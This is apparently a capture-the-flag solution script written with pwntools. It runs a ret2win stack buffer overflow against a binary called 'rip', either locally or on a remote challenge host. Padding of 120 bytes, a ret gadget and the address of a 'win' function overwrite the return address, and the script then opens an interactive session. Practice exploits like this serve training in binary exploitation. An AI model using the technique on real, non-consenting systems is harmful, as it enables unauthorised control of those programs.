from pwn import *

elf = ELF("./rip")
if args["REMOTE"]:
    p = remote("io.ept.gg", 30009)
else:
    p = elf.process()

# Craft payload
offset = 120
payload = b'A' * offset
payload += p64(0x40101a) # assembly ret instruction address
payload += p64(elf.symbols["win"])

p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()
